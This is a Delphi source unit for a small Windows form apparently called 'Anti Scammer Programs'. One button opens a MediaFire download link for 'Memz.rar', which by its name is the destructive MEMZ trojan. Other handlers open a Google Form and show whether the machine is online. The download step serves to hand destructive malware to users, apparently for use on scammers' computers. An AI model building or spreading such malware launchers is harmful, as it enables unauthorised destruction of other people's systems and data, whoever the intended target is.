unit uAntiScammerPrograms;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.Imaging.jpeg, Vcl.ExtCtrls,
  IdBaseComponent, IdComponent, IdTCPConnection, IdTCPClient, IdHTTP,
  Vcl.StdCtrls, WinInet, ShellAPI;

type
  TfrmASP = class(TForm)
    img1: TImage;
    btnmemz: TButton;
    lbl1: TLabel;
    idhtp1: TIdHTTP;
    Button1: TButton;
    lblconnection: TLabel;
    procedure btnmemzClick(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  frmASP: TfrmASP;

implementation

{$R *.dfm}

procedure TfrmASP.btnmemzClick(Sender: TObject);
var
  memz : string;
begin
  memz := 'http://download1648.mediafire.com/aztbv1zywwfg/pmm2rot02zq2onp/Memz.rar';
  ShellExecute(Application.Handle, PChar('open'), PChar(memz), nil, nil, SW_SHOW);
end;

procedure TfrmASP.Button1Click(Sender: TObject);
var
  submit : string;
begin
  submit := 'https://goo.gl/forms/Zt5dpJFgJ3cb4Kwv2';
  ShellExecute(Application.Handle, PChar('open'), PChar(submit), nil, nil, SW_SHOW);
end;

procedure TfrmASP.FormActivate(Sender: TObject);
var
  bconnected : Boolean;
  origin : Cardinal;
begin
  bconnected := InternetGetConnectedState(@origin,0);

  if bconnected = True then
    begin
      lblconnection.Caption := 'Online';
      lblconnection.Font.Color := clLime;
    end
  else
    begin
      lblconnection.Caption := 'Offline';
      lblconnection.Font.Color := clRed;
    end;
end;

end.
